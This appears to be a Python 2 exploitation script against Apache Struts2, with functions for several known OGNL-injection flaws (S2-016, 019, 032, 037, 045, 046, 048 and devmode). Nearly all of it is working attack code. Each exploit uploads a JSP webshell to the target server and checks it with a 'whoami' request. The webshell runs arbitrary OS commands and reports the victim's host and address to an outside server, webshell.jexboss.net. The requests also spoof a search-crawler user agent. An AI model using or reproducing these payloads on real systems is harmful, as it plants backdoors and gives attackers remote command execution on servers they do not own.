#! /usr/bin/env python
# -*-coding:utf-8-*-


import json
import requests
import urlparse


constant = ['index.action','login.action','index.do','login.do']

#影响范围非常大
def struts2_016(url):
    info={}
    req_urls=get_req_url(url)
    headers = {"Content-Type": "application/x-www-form-urlencoded",
               "User-Agent":"Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)"}
    exp = '''redirect:${%23req%3d%23context.get('com.opensymphony.xwork2.dispatcher.HttpServletRequest'),%23res%3d%23context.get('com.opensymphony.xwork2.dispatcher.HttpServletResponse'),%23res.getWriter().print(%22oko%22),%23res.getWriter().print(%22kok/%22),%23res.getWriter().print(%23req.getContextPath()),%23res.getWriter().flush(),%23res.getWriter().close(),new+java.io.BufferedWriter(new+java.io.FileWriter(%23req.getRealPath(%22/secs16.jsp%22))).append(%23req.getParameter(%22shell%22)).close()}&shell=%3c%25%40+page+import%3d%22java.util.*%2cjava.io.*%2c+java.net.*%22+pageEncoding%3d%22UTF-8%22%25%3e%3cpre%3e%3c%25if(request.getParameter(%22ppp%22)+!%3d+null)%7b+URL+url+%3d+new+URL(%22http%3a%2f%2fwebshell.jexboss.net%2f%22)%3b+HttpURLConnection+check+%3d+(HttpURLConnection)+url.openConnection()%3b+String+writepermission+%3d+(new+Date().toString().split(%22%3a%22)%5b0%5d%2b%22h.log%22).replaceAll(%22+%22%2c+%22-%22)%3b+String+sh%5b%5d+%3d+request.getParameter(%22ppp%22).split(%22+%22)%3b+check.setRequestProperty(%22User-Agent%22%2c+request.getHeader(%22Host%22)%2b%22%3c-%22%2brequest.getRemoteAddr())%3b+if+(!new+File(%22check_%22%2bwritepermission).exists())%7b+PrintWriter+writer+%3d+new+PrintWriter(%22check_%22%2bwritepermission)%3b+check.getInputStream()%3b+writer.close()%3b+%7d+else+if+(sh%5b0%5d.contains(%22id%22)+%7c%7c+sh%5b0%5d.contains(%22ipconfig%22))+check.getInputStream()%3b+try+%7b+Process+p%3b+if+(System.getProperty(%22os.name%22).toLowerCase().indexOf(%22win%22)+%3e+0)%7b+p+%3d+Runtime.getRuntime().exec(%22cmd.exe+%2fc+%22%2bsh)%3b+%7d+else+%7bp+%3d+Runtime.getRuntime().exec(sh)%3b%7d+BufferedReader+d+%3d+new+BufferedReader(new+InputStreamReader(p.getInputStream()))%3b+String+disr+%3d+d.readLine()%3b+while+(disr+!%3d+null)+%7b+out.println(disr)%3b+disr+%3d+d.readLine()%3b+%7d+%7dcatch(Exception+e)+%7bout.println(%22Unknown+command.%22)%3b%7d%7d%25%3e'''
    for req_url in req_urls:
        try:
                resp = requests.post(req_url,data=exp,headers=headers, timeout=10)
                if "okokok" in resp.content:
                    info.update({'shell':get_baseurls(req_url)[0]+'/secs16.jsp?ppp=whoami'})
        except BaseException as e:
            pass
    return confirm(info['shell']) if len(info) > 0 else False



# S2-046方式可能绕过部分WAF防护，存在S2-045就存在S2-046
def struts2_046(url):
    info = {}
    req_urls=get_req_url(url)
    headers = {"User-Agent": "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)"}
    _filename = '''%{(#test='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#req=@org.apache.struts2.ServletActionContext@getRequest()).(#res=@org.apache.struts2.ServletActionContext@getResponse()).(#res.setContentType('text/html;charset=UTF-8')).(#filecontent='%3c%25%40+page+import%3d%22java.util.*%2cjava.io.*%2c+java.net.*%22+pageEncoding%3d%22UTF-8%22%25%3e%3cpre%3e%3c%25if(request.getParameter(%22ppp%22)+!%3d+null)%7b+URL+url+%3d+new+URL(%22http%3a%2f%2fwebshell.jexboss.net%2f%22)%3b+HttpURLConnection+check+%3d+(HttpURLConnection)+url.openConnection()%3b+String+writepermission+%3d+(new+Date().toString().split(%22%3a%22)%5b0%5d%2b%22h.log%22).replaceAll(%22+%22%2c+%22-%22)%3b+String+sh%5b%5d+%3d+request.getParameter(%22ppp%22).split(%22+%22)%3b+check.setRequestProperty(%22User-Agent%22%2c+request.getHeader(%22Host%22)%2b%22%3c-%22%2brequest.getRemoteAddr())%3b+if+(!new+File(%22check_%22%2bwritepermission).exists())%7b+PrintWriter+writer+%3d+new+PrintWriter(%22check_%22%2bwritepermission)%3b+check.getInputStream()%3b+writer.close()%3b+%7d+else+if+(sh%5b0%5d.contains(%22id%22)+%7c%7c+sh%5b0%5d.contains(%22ipconfig%22))+check.getInputStream()%3b+try+%7b+Process+p%3b+if+(System.getProperty(%22os.name%22).toLowerCase().indexOf(%22win%22)+%3e+0)%7b+p+%3d+Runtime.getRuntime().exec(%22cmd.exe+%2fc+%22%2bsh)%3b+%7d+else+%7bp+%3d+Runtime.getRuntime().exec(sh)%3b%7d+BufferedReader+d+%3d+new+BufferedReader(new+InputStreamReader(p.getInputStream()))%3b+String+disr+%3d+d.readLine()%3b+while+(disr+!%3d+null)+%7b+out.println(disr)%3b+disr+%3d+d.readLine()%3b+%7d+%7dcatch(Exception+e)+%7bout.println(%22Unknown+command.%22)%3b%7d%7d%25%3e').(new java.io.BufferedWriter(new java.io.FileWriter(#req.getSession().getServletContext().getRealPath('/secs46.jsp'))).append(new java.net.URLDecoder().decode(#filecontent,'UTF-8')).close()).(#res.getWriter().print('oko')).(#res.getWriter().print('kok/')).(#res.getWriter().print(#req.getContextPath())).(#res.getWriter().flush()).(#res.getWriter().close())}\x00b'''
    _file = [('test', (_filename, 'x', 'text/plain'))]
    verify = '''%{(#test='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#req=@org.apache.struts2.ServletActionContext@getRequest()).(#res=@org.apache.struts2.ServletActionContext@getResponse()).(#res.setContentType('text/html;charset=UTF-8')).(#res.getWriter().print('security_')).(#res.getWriter().print('check')).(#res.getWriter().flush()).(#res.getWriter().close())}\x00b'''
    for req_url in req_urls:
        try:
                resp = requests.post(req_url, files=_file, headers=headers, timeout=10)
                if "okokok" in resp.content:
                    info.update({'shell': get_baseurls(req_url)[0] + '/secs46.jsp?ppp=whoami'})
        except BaseException as e:
            pass
    return confirm(info['shell']) if len(info) > 0 else False



#struts2_045影响范围大
def struts2_045(url):
    info={}
    req_urls = get_req_url(url)
    headers = {"Content-Type": "application/x-www-form-urlencoded",
               "User-Agent":"Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)"}
    exp = '''<%@ page import="java.util.*,java.io.*, java.net.*" pageEncoding="UTF-8"%><pre><%if(request.getParameter("ppp") != null){ URL url = new URL("http://webshell.jexboss.net/"); HttpURLConnection check = (HttpURLConnection) url.openConnection(); String writepermission = (new Date().toString().split(":")[0]+"h.log").replaceAll(" ", "-"); String sh[] = request.getParameter("ppp").split(" "); check.setRequestProperty("User-Agent", request.getHeader("Host")+"<-"+request.getRemoteAddr()); if (!new File("check_"+writepermission).exists()){ PrintWriter writer = new PrintWriter("check_"+writepermission); check.getInputStream(); writer.close(); } else if (sh[0].contains("id") || sh[0].contains("ipconfig")) check.getInputStream(); try { Process p; if (System.getProperty("os.name").toLowerCase().indexOf("win") > 0){ p = Runtime.getRuntime().exec("cmd.exe /c "+sh); } else {p = Runtime.getRuntime().exec(sh);} BufferedReader d = new BufferedReader(new InputStreamReader(p.getInputStream())); String disr = d.readLine(); while (disr != null) { out.println(disr); disr = d.readLine(); } }catch(Exception e) {out.println("Unknown command.");}}%>'''
    for req_url in req_urls:
        try:
            headers["Content-Type"] = '''%{(#test='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#req=@org.apache.struts2.ServletActionContext@getRequest()).(#res=@org.apache.struts2.ServletActionContext@getResponse()).(#res.setContentType('text/html;charset=UTF-8')).(#fs=new java.io.FileOutputStream(#req.getSession().getServletContext().getRealPath('/secs45.jsp'))).(#out=#res.getOutputStream()).(@org.apache.commons.io.IOUtils@copy(#req.getInputStream(),#fs)).(#fs.close()).(#out.print('oko')).(#out.print('kok/')).(#out.print(#req.getContextPath())).(#out.close())}'''
            resp = requests.post(req_url,data=exp,headers=headers, timeout=10)
            if "okokok" in resp.content:
                info.update({'shell':get_baseurls(req_url)[0]+'/secs45.jsp?ppp=whoami'})
        except BaseException as e:
            pass
    return confirm(info['shell']) if len(info) > 0 else False




#影响范围一般
def struts2_019(url):
    info={}
    req_urls = get_req_url(url)
    headers = {"Content-Type": "application/x-www-form-urlencoded",
               "User-Agent":"Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)"}
    exp = '''debug=command&expression=%23req%3d%23context.get('com.opensymphony.xwork2.dispatcher.HttpServletRequest'),%23res%3d%23context.get('com.opensymphony.xwork2.dispatcher.HttpServletResponse'),%23res.getWriter().print(%22oko%22),%23res.getWriter().print(%22kok/%22),%23res.getWriter().print(%23req.getContextPath()),%23res.getWriter().flush(),%23res.getWriter().close(),new+java.io.BufferedWriter(new+java.io.FileWriter(%23req.getRealPath(%22/secs19.jsp%22))).append(%23req.getParameter(%22shell%22)).close()&shell=%3c%25%40+page+import%3d%22java.util.*%2cjava.io.*%2c+java.net.*%22+pageEncoding%3d%22UTF-8%22%25%3e%3cpre%3e%3c%25if(request.getParameter(%22ppp%22)+!%3d+null)%7b+URL+url+%3d+new+URL(%22http%3a%2f%2fwebshell.jexboss.net%2f%22)%3b+HttpURLConnection+check+%3d+(HttpURLConnection)+url.openConnection()%3b+String+writepermission+%3d+(new+Date().toString().split(%22%3a%22)%5b0%5d%2b%22h.log%22).replaceAll(%22+%22%2c+%22-%22)%3b+String+sh%5b%5d+%3d+request.getParameter(%22ppp%22).split(%22+%22)%3b+check.setRequestProperty(%22User-Agent%22%2c+request.getHeader(%22Host%22)%2b%22%3c-%22%2brequest.getRemoteAddr())%3b+if+(!new+File(%22check_%22%2bwritepermission).exists())%7b+PrintWriter+writer+%3d+new+PrintWriter(%22check_%22%2bwritepermission)%3b+check.getInputStream()%3b+writer.close()%3b+%7d+else+if+(sh%5b0%5d.contains(%22id%22)+%7c%7c+sh%5b0%5d.contains(%22ipconfig%22))+check.getInputStream()%3b+try+%7b+Process+p%3b+if+(System.getProperty(%22os.name%22).toLowerCase().indexOf(%22win%22)+%3e+0)%7b+p+%3d+Runtime.getRuntime().exec(%22cmd.exe+%2fc+%22%2bsh)%3b+%7d+else+%7bp+%3d+Runtime.getRuntime().exec(sh)%3b%7d+BufferedReader+d+%3d+new+BufferedReader(new+InputStreamReader(p.getInputStream()))%3b+String+disr+%3d+d.readLine()%3b+while+(disr+!%3d+null)+%7b+out.println(disr)%3b+disr+%3d+d.readLine()%3b+%7d+%7dcatch(Exception+e)+%7bout.println(%22Unknown+command.%22)%3b%7d%7d%25%3e'''
    for req_url in req_urls:
        try:
            resp = requests.post(req_url,data=exp,headers=headers, timeout=10)
            if "okokok" in resp.content:
                info.update({'shell':get_baseurls(req_url)[0]+'/secs19.jsp?ppp=whoami'})
        except BaseException as e:
            pass
    return confirm(info['shell']) if len(info) > 0 else False


#影响范围小
def struts2_032(url):
    info={}
    req_urls = get_req_url(url)
    headers = {"Content-Type": "application/x-www-form-urlencoded",
               "User-Agent":"Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)"}
    exp = '''method:%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23req%3d%40org.apache.struts2.ServletActionContext%40getRequest(),%23res%3d%40org.apache.struts2.ServletActionContext%40getResponse(),%23res.setCharacterEncoding(%23parameters.encoding[0]),%23w%3d%23res.getWriter(),%23path%3d%23req.getRealPath(%23parameters.pp[0]),new%20java.io.BufferedWriter(new%20java.io.FileWriter(%23path%2b%23parameters.shellname[0]).append(%23parameters.shellContent[0])).close(),%23w.print(%23parameters.info1[0]),%23w.print(%23parameters.info2[0]),%23w.print(%23req.getContextPath()),%23w.close(),1?%23xx:%23request.toString&shellname=secs32.jsp&shellContent=%3c%25%40+page+import%3d%22java.util.*%2cjava.io.*%2c+java.net.*%22+pageEncoding%3d%22UTF-8%22%25%3e%3cpre%3e%3c%25if(request.getParameter(%22ppp%22)+!%3d+null)%7b+URL+url+%3d+new+URL(%22http%3a%2f%2fwebshell.jexboss.net%2f%22)%3b+HttpURLConnection+check+%3d+(HttpURLConnection)+url.openConnection()%3b+String+writepermission+%3d+(new+Date().toString().split(%22%3a%22)%5b0%5d%2b%22h.log%22).replaceAll(%22+%22%2c+%22-%22)%3b+String+sh%5b%5d+%3d+request.getParameter(%22ppp%22).split(%22+%22)%3b+check.setRequestProperty(%22User-Agent%22%2c+request.getHeader(%22Host%22)%2b%22%3c-%22%2brequest.getRemoteAddr())%3b+if+(!new+File(%22check_%22%2bwritepermission).exists())%7b+PrintWriter+writer+%3d+new+PrintWriter(%22check_%22%2bwritepermission)%3b+check.getInputStream()%3b+writer.close()%3b+%7d+else+if+(sh%5b0%5d.contains(%22id%22)+%7c%7c+sh%5b0%5d.contains(%22ipconfig%22))+check.getInputStream()%3b+try+%7b+Process+p%3b+if+(System.getProperty(%22os.name%22).toLowerCase().indexOf(%22win%22)+%3e+0)%7b+p+%3d+Runtime.getRuntime().exec(%22cmd.exe+%2fc+%22%2bsh)%3b+%7d+else+%7bp+%3d+Runtime.getRuntime().exec(sh)%3b%7d+BufferedReader+d+%3d+new+BufferedReader(new+InputStreamReader(p.getInputStream()))%3b+String+disr+%3d+d.readLine()%3b+while+(disr+!%3d+null)+%7b+out.println(disr)%3b+disr+%3d+d.readLine()%3b+%7d+%7dcatch(Exception+e)+%7bout.println(%22Unknown+command.%22)%3b%7d%7d%25%3e&encoding=UTF-8&pp=%2f&info1=oko&info2=kok%2f'''
    for req_url in req_urls:
        try:
            resp = requests.post(req_url,data=exp,headers=headers, timeout=10)
            if "okokok" in resp.content:
                info.update({'shell':get_baseurls(req_url)[0]+'/secs32.jsp?ppp=whoami'})
        except BaseException as e:
            pass
    return confirm(info['shell']) if len(info) > 0 else False


#影响范围小
def struts2_devmode(url):
    info={}
    redirects = ['location.href=', 'history.back(-1)','history.go(-1)']
    req_urls = get_req_url(url)
    headers = {"Content-Type": "application/x-www-form-urlencoded",
               "User-Agent":"Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)"}
    exp = '''debug=browser&object=(%23_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)%3f(%23context[%23parameters.rpsobj[0]].getWriter().println(@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(%23parameters.command[0]).getInputStream()))):xx.toString.json&rpsobj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&content=123456789&command=whoami'''
    for req_url in req_urls:
        try:
            resp = requests.post(req_url,data=exp,headers=headers, timeout=10, allow_redirects=False)
            length = int(resp.headers['Content-Length'])
            if resp.status_code == 200 and length != 0:
                for _ in redirects:
                    if _ in resp.content: return False
                info.update({'vul':req_url})
        except BaseException as e:
            pass
    return info['vul'] if len(info) > 0 else False


#影响范围小
def struts2_037(url):
    info={}
    req_urls = get_req_url(url)
    headers = {"Content-Type": "application/x-www-form-urlencoded",
               "User-Agent":"Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)"}
    exp='''(%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)%3f(%23req%3d%40org.apache.struts2.ServletActionContext%40getRequest(),%23res%3d%40org.apache.struts2.ServletActionContext%40getResponse(),%23res.setCharacterEncoding(%23parameters.encoding[0]),%23w%3d%23res.getWriter(),%23path%3d%23req.getRealPath(%23parameters.pp[0]),new%20java.io.BufferedWriter(new%20java.io.FileWriter(%23path%2b%23parameters.shellname[0]).append(%23parameters.shellContent[0])).close(),%23w.print(%23parameters.info1[0]),%23w.print(%23parameters.info2[0]),%23w.print(%23req.getContextPath()),%23w.close()):xx.toString.json&shellname=secs37.jsp&shellContent=%3c%25%40+page+import%3d%22java.util.*%2cjava.io.*%2c+java.net.*%22+pageEncoding%3d%22UTF-8%22%25%3e%3cpre%3e%3c%25if(request.getParameter(%22ppp%22)+!%3d+null)%7b+URL+url+%3d+new+URL(%22http%3a%2f%2fwebshell.jexboss.net%2f%22)%3b+HttpURLConnection+check+%3d+(HttpURLConnection)+url.openConnection()%3b+String+writepermission+%3d+(new+Date().toString().split(%22%3a%22)%5b0%5d%2b%22h.log%22).replaceAll(%22+%22%2c+%22-%22)%3b+String+sh%5b%5d+%3d+request.getParameter(%22ppp%22).split(%22+%22)%3b+check.setRequestProperty(%22User-Agent%22%2c+request.getHeader(%22Host%22)%2b%22%3c-%22%2brequest.getRemoteAddr())%3b+if+(!new+File(%22check_%22%2bwritepermission).exists())%7b+PrintWriter+writer+%3d+new+PrintWriter(%22check_%22%2bwritepermission)%3b+check.getInputStream()%3b+writer.close()%3b+%7d+else+if+(sh%5b0%5d.contains(%22id%22)+%7c%7c+sh%5b0%5d.contains(%22ipconfig%22))+check.getInputStream()%3b+try+%7b+Process+p%3b+if+(System.getProperty(%22os.name%22).toLowerCase().indexOf(%22win%22)+%3e+0)%7b+p+%3d+Runtime.getRuntime().exec(%22cmd.exe+%2fc+%22%2bsh)%3b+%7d+else+%7bp+%3d+Runtime.getRuntime().exec(sh)%3b%7d+BufferedReader+d+%3d+new+BufferedReader(new+InputStreamReader(p.getInputStream()))%3b+String+disr+%3d+d.readLine()%3b+while+(disr+!%3d+null)+%7b+out.println(disr)%3b+disr+%3d+d.readLine()%3b+%7d+%7dcatch(Exception+e)+%7bout.println(%22Unknown+command.%22)%3b%7d%7d%25%3e&encoding=UTF-8&pp=%2f&info1=oko&info2=kok%2f'''
    for req_url in req_urls:
        try:
            resp = requests.post(req_url,data=exp,headers=headers, timeout=10)
            if "okokok" in resp.content:
                info.update({'shell':get_baseurls(req_url)[0]+'/secs37.jsp?ppp=whoami'})
        except BaseException as e:
            pass
    return confirm(info['shell']) if len(info) > 0 else False



#影响范围小
def struts2_048(url):
    info={}
    req_urls = get_req_url(url)
    headers = {"Content-Type": "application/x-www-form-urlencoded",
               "User-Agent":"Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)"}
    exp='''name=%25%7b(%23test%3d%27multipart%2fform-data%27).(%23dm%3d%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS).(%23_memberAccess%3f(%23_memberAccess%3d%23dm)%3a((%23container%3d%23context%5b%27com.opensymphony.xwork2.ActionContext.container%27%5d).(%23ognlUtil%3d%23container.getInstance(%40com.opensymphony.xwork2.ognl.OgnlUtil%40class)).(%23ognlUtil.getExcludedPackageNames().clear()).(%23ognlUtil.getExcludedClasses().clear()).(%23context.setMemberAccess(%23dm)))).(%23req%3d%40org.apache.struts2.ServletActionContext%40getRequest()).(%23res%3d%40org.apache.struts2.ServletActionContext%40getResponse()).(%23res.setContentType(%27text%2fhtml%3bcharset%3dUTF-8%27)).(%23res.getWriter().print(%27start%3a%27)).(%23fs%3dnew+java.io.FileOutputStream(%23req.getSession().getServletContext().getRealPath(%27%2fsecs48.jsp%27))).(%23out%3d%23res.getOutputStream()).(%40org.apache.commons.io.IOUtils%40copy(%23req.getInputStream()%2c%23fs)).(%23fs.close()).(%23out.print(%27oko%27)).(%23out.print(%27kok%2f%3aend%27)).(%23out.print(%23req.getContextPath())).(%23out.close())%7d&age=a&__checkbox_bustedBefore=true&description=s'''
    for req_url in req_urls:
        try:
            resp = requests.post(req_url,data=exp,headers=headers, timeout=10)
            if "okokok" in resp.content:
                info.update({'shell':get_baseurls(req_url)[0]+'/secs48.jsp?ppp=whoami'})
        except BaseException as e:
            pass
    return confirm(info['shell']) if len(info) > 0 else False




def get_req_url(url):
    if '.do' in url or '.action' in url:
        return [url.split('?')[0]]
    elif '://' not in url:
        url = 'http://' + url
        return [url + '/' + suffix for suffix in constant]
    else:
        return [url + '/' + suffix for suffix in constant]


def get_baseurls(weburl):
    _baseUrls = []
    _basePathes = ['']
    _new_weburl = weburl.strip()
    _urlObj = urlparse.urlparse(_new_weburl)
    _urlPath = _urlObj.path
    if _urlPath != '':
        _pathArray = _urlPath.split('/')
        _pathArray.pop()
        _basePath = ''
        for _path in _pathArray:
            if _path != '':
                _basePath = _basePath + '/' + _path
                _basePathes.append(_basePath)
    for _basePath in _basePathes:
        _baseUrl = '%s://%s%s' % (_urlObj.scheme,_urlObj.netloc,_basePath)
        _baseUrls.append(_baseUrl)
    return _baseUrls



def confirm(shell_url):
    redirects =['location.href','history.back(-1)','history.go(-1)']
    try:
        resp = requests.get(url=shell_url.strip(), allow_redirects=False)
        length = int(resp.headers['Content-Length'])
        if resp.status_code == 200 and length !=0:
            for _ in redirects:
                if _ in resp.content: return False
            return shell_url
    except:
        pass
    return False


def poc(url):
    info={}
    # devmode = struts2_devmode(url)
    devmode=None
    s2_032 = struts2_032(url)
    s2_019 = struts2_019(url)
    s2_016 = struts2_016(url)
    s2_045 = struts2_045(url)
    s2_037 = struts2_037(url)
    s2_046 = struts2_046(url)
    s2_048 = struts2_048(url)
    if devmode:
        info.update({"devmode":devmode})
    if s2_032:
        info.update({"s2_032": s2_032})
    if s2_019:
        info.update({"s2_019": s2_019})
    if s2_016:
        info.update({"s2_016": s2_016})
    if s2_045:
        info.update({"s2_045": s2_045})
    if s2_037:
        info.update({"s2_037": s2_037})
    if s2_046:
        info.update({"s2_046": s2_046})
    if s2_048:
        info.update({"s2_048": s2_048})
    if len(info)>0:
        return json.dumps(info,indent=2)
    else:
        return False


if __name__ == '__main__':
    print poc('http://192.168.55.1:8080/index.action')



